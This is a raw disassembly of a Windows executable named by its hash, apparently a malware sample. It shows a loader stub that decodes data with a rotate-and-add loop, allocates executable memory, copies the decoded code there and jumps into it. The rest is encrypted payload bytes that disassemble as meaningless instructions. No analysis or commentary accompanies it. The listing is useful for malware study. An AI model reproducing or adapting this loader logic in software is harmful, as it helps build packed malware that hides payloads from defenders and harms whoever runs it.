
04a61b9203c7cb38b75958ecdcca4182aafc50a0c4eb24f5ffabb4f2fc969d60.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0x1b54b2b9
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	and    al,0xdb
  4114ad:	icebp  
  4114ae:	shl    ecx,0xc4
  4114b1:	call   0xfc86:0xa388366f
  4114b8:	mov    ds:0xa03af813,eax
  4114bd:	mov    esi,0x821cf462
  4114c2:	inc    ebx
  4114c3:	lea    edi,[ecx+0x38]
  4114c6:	push   ebp
  4114c7:	and    dh,BYTE PTR [ebp+0x347f7f58]
  4114cd:	fs daa 
  4114cf:	(bad)  
  4114d0:	sbb    al,0x86
  4114d2:	out    0x24,eax
  4114d4:	or     edx,DWORD PTR [esi]
  4114d6:	pop    esp
  4114d7:	sub    BYTE PTR [eax],bl
  4114d9:	xor    ebx,DWORD PTR [ebx]
  4114db:	push   edi
  4114dc:	out    dx,al
  4114dd:	out    dx,al
  4114de:	fcom   QWORD PTR [ebx]
  4114e0:	jns    0x411522
  4114e2:	pop    ecx
  4114e3:	pop    esi
  4114e4:	faddp  st(1),st
  4114e6:	cmp    DWORD PTR [edx+0x5970d8b6],0x6111b91b
  4114f0:	scas   eax,DWORD PTR es:[edi]
  4114f1:	cmp    DWORD PTR [esi-0x7d],ebx
  4114f4:	in     al,0xb4
  4114f6:	into   
  4114f7:	popf   
  4114f8:	mov    ds:0x8742d18f,eax
  4114fd:	push   ecx
  4114fe:	aaa    
  4114ff:	iret   
  411500:	xor    ebp,DWORD PTR [esi+0x7570427b]
  411506:	cmp    BYTE PTR [ecx],dl
  411508:	cdq    
  411509:	ficomp DWORD PTR [esi]
  41150b:	inc    ecx
  41150c:	(bad)  
  41150d:	and    esp,esp
  41150f:	pop    ecx
  411510:	(bad)  
  411511:	into   
  411512:	and    esi,DWORD PTR [esp+ecx*4+0x938da9]
  411519:	lods   al,BYTE PTR ds:[esi]
  41151a:	je     0x411518
  41151c:	pop    esp
  41151d:	inc    ebp
  41151e:	jae    0x411568
  411520:	mov    ?,WORD PTR [esi-0x682ed0ac]
  411526:	push   ecx
  411527:	push   0x978fad58
  41152c:	add    ebp,DWORD PTR [ebx+0x5e6e457d]
  411532:	pop    esp
  411533:	ins    BYTE PTR es:[edi],dx
  411534:	or     al,0x7c
  411536:	js     0x41154a
  411538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411539:	int3   
  41153a:	jg     0x411568
  41153c:	loope  0x4114d2
  41153e:	dec    ebp
  41153f:	int3   
  411540:	jb     0x4115a6
  411542:	es push ds
  411544:	mov    dl,0x49
  411546:	fcom   QWORD PTR fs:0xc7770e7
  41154d:	dec    ebx
  41154e:	repnz cld 
  411550:	cdq    
  411551:	mov    ecx,0xfab19d9f
  411556:	pop    edx
  411557:	sub    ebp,DWORD PTR ds:0x13da2f29
  41155d:	push   0x213c79e
  411562:	push   ds
  411563:	or     ebp,DWORD PTR [ebp+0x2d14b58d]
  411569:	fsub   DWORD PTR [edi+esi*4]
  41156c:	repz (bad) 
  41156e:	jg     0x411502
  411570:	leave  
  411571:	inc    eax
  411572:	push   es
  411573:	adc    BYTE PTR [ecx-0x3b],bh
  411576:	mov    ch,0x84
  411578:	es inc edx
  41157a:	das    
  41157b:	push   ebp
  41157c:	lods   al,BYTE PTR ds:[esi]
  41157d:	and    DWORD PTR [edx+ecx*8],ecx
  411580:	jnp    0x411549
  411582:	pop    es
  411583:	inc    esi
  411584:	sahf   
  411585:	xchg   esp,eax
  411586:	adc    eax,0x315fe966
  41158b:	and    DWORD PTR [esi+0x64dfdf85],esi
  411591:	imul   DWORD PTR [ebp-0xa]
  411594:	inc    esi
  411595:	out    0xd8,eax
  411597:	lods   al,BYTE PTR ds:[esi]
  411598:	inc    ebx
  411599:	push   0x68e01c73
  41159e:	gs mov edx,0x2c86de2
  4115a4:	shl    DWORD PTR [ecx],1
  4115a6:	sub    DWORD PTR [ebx-0x3e],0x633ee0f3
  4115ad:	sahf   
  4115ae:	or     DWORD PTR [eax],0x59677f63
  4115b4:	test   eax,0x46536838
  4115b9:	retf   0x6456
  4115bc:	sub    BYTE PTR [edi+0xf],0x1c
  4115c0:	mov    ?,edi
  4115c2:	loopne 0x411603
  4115c4:	ins    DWORD PTR es:[edi],dx
  4115c5:	push   edx
  4115c6:	and    eax,0x9f446c17
  4115cb:	push   ds
  4115cc:	mov    esi,DWORD PTR [ebp+edx*8-0x50258274]
  4115d3:	and    ebp,DWORD PTR [esi]
  4115d5:	fcomp  QWORD PTR [esi+0x6e]
  4115d8:	xor    al,BYTE PTR [eax]
  4115da:	mov    eax,ds:0x1780f749
  4115df:	lock jle 0x4115f3
  4115e2:	and    cl,ah
  4115e4:	sar    BYTE PTR [edi+0x62],0xe3
  4115e8:	push   esp
  4115e9:	pop    edi
  4115ea:	imul   al
  4115ec:	push   edx
  4115ed:	adc    dh,BYTE PTR [ebx]
  4115ef:	idiv   BYTE PTR [edx+0x729cb43c]
  4115f5:	cs ss push edx
  4115f8:	or     BYTE PTR [edx-0x4ba04f32],bh
  4115fe:	scas   al,BYTE PTR es:[edi]
  4115ff:	xchg   ebx,eax
  411600:	xor    DWORD PTR [ebx-0x5f],esi
  411603:	adc    DWORD PTR [edx],eax
  411605:	bound  esp,QWORD PTR [ecx-0x60]
  411608:	mov    edi,0x8550b97c
  41160d:	jl     0x41163b
  41160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411610:	sahf   
  411611:	mov    ds:0x3ba1733f,eax
  411616:	stc    
  411617:	add    ebx,DWORD PTR [ecx+0xf]
  41161a:	dec    esi
  41161b:	ja     0x4115f8
  41161d:	loopne 0x41166e
  41161f:	pop    eax
  411620:	pop    ebx
  411621:	dec    ecx
  411622:	mov    es,WORD PTR [edx+0x431f1d57]
  411628:	add    al,0x7b
  41162a:	adc    al,0x4
  41162c:	pop    es
  41162d:	lea    esp,[eax+eax*4+0x6f]
  411631:	xor    al,0x17
  411633:	mov    DWORD PTR [ebp+0x5cd5e4ad],esi
  411639:	push   0xffffffc4
  41163b:	pop    ecx
  41163c:	jnp    0x4115c0
  41163e:	jg     0x4116b1
  411640:	mov    edi,0x7e7735d8
  411645:	imul   ebx,DWORD PTR [ecx],0x861e7dfa
  41164b:	addr16 and ebp,ebx
  41164e:	in     al,0x94
  411650:	popf   
  411651:	mov    esp,0xc0d67673
  411656:	and    edx,DWORD PTR [edi-0x16]
  411659:	or     bl,BYTE PTR [eax-0x5c2f68a2]
  41165f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411660:	(bad)  
  411661:	jp     0x4115fe
  411663:	outs   dx,BYTE PTR ds:[esi]
  411664:	sahf   
  411665:	mov    WORD PTR [eax-0x4a892d9],fs
  41166b:	cmp    esi,DWORD PTR [esi+0x2b]
  41166e:	sbb    esp,edi
  411670:	sub    edi,ecx
  411672:	jmp    0xecf9c81d
  411677:	xchg   ebp,eax
  411678:	sbb    ebx,DWORD PTR [ebx-0x5c68d1f5]
  41167e:	sub    bh,dh
  411680:	inc    edx
  411681:	call   0x80a32a4f
  411686:	mov    ebp,es
  411688:	xor    DWORD PTR [edi+eax*8-0x2b6e4e68],0x39
  411690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411691:	xchg   ecx,eax
  411692:	and    DWORD PTR [ebp-0x5e],0xa
  411696:	idiv   BYTE PTR [ebp-0x2]
  411699:	xor    eax,0xe72b6d
  41169e:	mov    DWORD PTR [ecx+0x7d890dcd],edi
  4116a4:	xor    BYTE PTR [edi+0x133e78f0],ch
  4116aa:	or     eax,0x852627ad
  4116af:	pop    ebp
  4116b0:	pop    es
  4116b1:	and    ebp,0xffffffa9
  4116b4:	retf   0x93b1
  4116b7:	add    al,0xc0
  4116b9:	add    al,0x91
  4116bb:	in     al,dx
  4116bc:	xchg   esi,eax
  4116bd:	imul   DWORD PTR [esi+0x1f]
  4116c0:	fwait
  4116c1:	push   es
  4116c2:	jb     0x4116b2
  4116c4:	add    dl,BYTE PTR [ebx-0x1a0c2165]
  4116ca:	sbb    DWORD PTR ds:0x37a5b45c,ebp
  4116d0:	jmp    0x1ab94c27
  4116d5:	ret    
  4116d6:	adc    ecx,ecx
  4116d8:	outs   dx,BYTE PTR ds:[esi]
  4116d9:	mov    ah,0x2c
  4116db:	add    ebp,DWORD PTR [edx+0x64]
  4116de:	mov    dh,0x11
  4116e0:	adc    al,0x13
  4116e2:	fwait
  4116e3:	jl     0x411722
  4116e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e6:	jns    0x411762
  4116e8:	arpl   WORD PTR [edx],sp
  4116ea:	ins    DWORD PTR es:[edi],dx
  4116eb:	adc    eax,0xf6afb3a3
  4116f0:	ror    esi,1
  4116f2:	or     eax,0xd522a14f
  4116f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f8:	ficom  WORD PTR [ebx+0x1c]
  4116fb:	cmp    ch,BYTE PTR [esi+0x3186db31]
  411701:	push   esi
  411702:	push   0xb5a3d716
  411707:	imul   edi,edi,0x2f7d2193
  41170d:	xor    DWORD PTR [edi-0x39fc51e5],edx
  411713:	push   0xffffff98
  411715:	sahf   
  411716:	pop    edi
  411717:	(bad)  
  411718:	icebp  
  411719:	or     ebp,esp
  41171b:	nop
  41171c:	or     eax,0x4f1ad46c
  411721:	push   ebp
  411722:	xchg   ebx,eax
  411723:	outs   dx,BYTE PTR ds:[esi]
  411724:	xchg   ebp,eax
  411725:	add    ebx,DWORD PTR [ecx]
  411727:	xchg   DWORD PTR [ebx],ebp
  411729:	cmp    BYTE PTR [esi+0x41128067],0xe1
  411730:	or     al,0x30
  411732:	and    BYTE PTR [edi],ch
  411734:	mov    ebx,0x18a9bb4f
  411739:	jo     0x4116d8
  41173b:	in     al,0x12
  41173d:	out    dx,al
  41173e:	jae    0x411771
  411740:	mov    dl,0x72
  411742:	jo     0x4116e9
  411744:	jg     0x411753
  411746:	test   al,0x13
  411748:	jbe    0x411779
  41174a:	mov    WORD PTR [ecx],?
  41174c:	mov    bh,BYTE PTR [eax+0x5]
  41174f:	inc    eax
  411750:	sub    BYTE PTR [edi-0x52dbf6ed],dh
  411756:	shl    BYTE PTR [edi],1
  411758:	mov    ah,0xc9
  41175a:	mov    ds:0xdb20a353,eax
  41175f:	scas   eax,DWORD PTR es:[edi]
  411760:	arpl   cx,cx
  411762:	xchg   esp,eax
  411763:	jmp    0x8ea4084
  411768:	jle    0x411777
  41176a:	cdq    
  41176b:	push   ss
  41176c:	mov    al,0xf2
  41176e:	jne    0x41179e
  411770:	xor    al,0x9c
  411772:	push   0x3d
  411774:	cld    
  411775:	mov    ch,0xb1
  411777:	fisttp QWORD PTR [ecx]
  411779:	xchg   ebx,eax
  41177a:	or     dh,BYTE PTR ss:[esp+esi*2-0x583054d5]
  411782:	cld    
  411783:	shl    BYTE PTR [edi-0x69],0xda
  411787:	icebp  
  411788:	jb     0x41170e
  41178a:	aas    
  41178b:	xor    cl,BYTE PTR [eax]
  41178d:	loopne 0x4117f4
  41178f:	mov    ebx,0x951a7e5
  411794:	outs   dx,DWORD PTR ds:[esi]
  411795:	push   ss
  411796:	jns    0x411805
  411798:	xor    edi,esi
  41179a:	mov    al,BYTE PTR [edi+0x7bbc9d88]
  4117a0:	retf   0xe2d9
  4117a3:	mov    esp,0xc70fa862
  4117a8:	dec    ecx
  4117a9:	shr    DWORD PTR [edx-0x31],cl
  4117ac:	pop    ds
  4117ad:	fs mov ah,0xe3
  4117b0:	into   
  4117b1:	pop    es
  4117b2:	sub    BYTE PTR [edx],dl
  4117b4:	shl    DWORD PTR [esi],0xc0
  4117b7:	shl    BYTE PTR [ebp+0x7bb82d56],1
  4117bd:	cmp    eax,0xc68db52f
  4117c2:	retf   0x347c
  4117c5:	test   DWORD PTR [eax-0x6d88627a],edi
  4117cb:	cld    
  4117cc:	ret    
  4117cd:	xchg   BYTE PTR [edi+0x6514497c],ch
  4117d3:	fs fcmovu st,st(1)
  4117d6:	and    ebx,DWORD PTR ds:0xbf2c429e
  4117dd:	push   es
  4117de:	jbe    0x4117e5
  4117e0:	add    cl,bl
  4117e2:	imul   ecx,DWORD PTR [ebx],0x304c7758
  4117e8:	mov    ebp,0x21f6106a
  4117ed:	inc    eax
  4117ee:	sub    eax,0x8ce112b7
  4117f3:	aas    
  4117f4:	ja     0x4117d0
  4117f6:	cwde   
  4117f7:	mov    edi,0xefe7372e
  4117fc:	jmp    0x38b6bece
  411801:	test   al,0xd1
  411803:	sar    BYTE PTR fs:[edx],0x7c
  411807:	adc    bh,BYTE PTR [edx+ebx*1]
  41180a:	xchg   ebp,eax
  41180b:	push   ds
  41180c:	inc    edi
  41180d:	(bad)  
  41180e:	fnstenv [edx+0x7e]
  411811:	stos   DWORD PTR es:[edi],eax
  411812:	add    al,0x3
  411814:	ins    DWORD PTR es:[edi],dx
  411815:	and    dl,BYTE PTR [esi]
  411817:	mov    ch,0x71
  411819:	dec    edx
  41181a:	mov    al,0x2b
  41181c:	adc    BYTE PTR [eax-0x59a6928b],dl
  411822:	cmp    eax,0x1d9342db
  411827:	push   edi
  411828:	js     0x4117eb
  41182a:	sti    
  41182b:	into   
  41182c:	outs   dx,BYTE PTR ds:[esi]
  41182d:	add    BYTE PTR [ecx+0x8362dee],dh
  411833:	fiadd  WORD PTR [edx]
  411835:	push   eax
  411836:	jp     0x41185f
  411838:	or     edi,DWORD PTR [ecx+eax*8+0x66]
  41183c:	push   ebx
  41183d:	dec    ebx
  41183e:	and    eax,0xd44750da
  411843:	dec    ecx
  411844:	(bad)  
  411845:	and    DWORD PTR [eax+0x30],ebx
  411848:	push   0xd5cb81a8
  41184d:	xor    bl,BYTE PTR [esi-0x62012bd7]
  411853:	xchg   edx,eax
  411854:	fdivp  st(4),st
  411856:	cli    
  411857:	repz and ch,bh
  41185a:	push   edx
  41185b:	xchg   esp,eax
  41185c:	dec    eax
  41185d:	sbb    bh,0xa6
  411860:	fistp  DWORD PTR [edx]
  411862:	fisttp QWORD PTR [eax+0x3b]
  411865:	mov    esp,0x37636753
  41186a:	adc    dh,BYTE PTR [eax+0xa645408]
  411870:	xlat   BYTE PTR ds:[ebx]
  411871:	rol    DWORD PTR [ebx-0x34a95a96],0x3
  411878:	and    BYTE PTR [esi+eax*2],0xdc
  41187c:	inc    esi
  41187d:	aas    
  41187e:	test   al,0xea
  411880:	push   ss
  411881:	pop    ss
  411882:	lds    ebx,FWORD PTR [edi-0x6a]
  411885:	dec    edi
  411886:	int3   
  411887:	and    al,bh
  411889:	sub    ecx,esi
  41188b:	dec    ebp
  41188c:	inc    ebx
  41188d:	jmp    0x79f9c380
  411892:	not    BYTE PTR [ecx-0x6ac55ec]
  411898:	dec    edx
  411899:	xor    DWORD PTR [edx+0x3ca6c5da],eax
  41189f:	jbe    0x4118bf
  4118a1:	sti    
  4118a2:	ret    0x1035
  4118a5:	mov    eax,0xf18c7b9a
  4118aa:	fdiv   QWORD PTR [ebx+0x30]
  4118ad:	cmp    DWORD PTR [esp+edi*2+0x41],0xe46df32f
  4118b5:	xchg   ebx,eax
  4118b6:	push   ebp
  4118b7:	fsub   DWORD PTR [ebx+0x42a92434]
  4118bd:	mov    esp,0x5e71b802
  4118c2:	mov    DWORD PTR [esi+ecx*1],ebx
  4118c5:	retf   
  4118c6:	add    esp,esp
  4118c8:	add    DWORD PTR ss:[esi],ecx
  4118cb:	in     eax,0x82
  4118cd:	retf   
  4118ce:	xor    DWORD PTR [ecx+0x70c1e483],esi
  4118d4:	pop    edi
  4118d5:	and    edx,DWORD PTR [eax+eiz*8+0x7f]
  4118d9:	sbb    ebp,0xb
  4118dc:	lock scas al,BYTE PTR es:[edi]
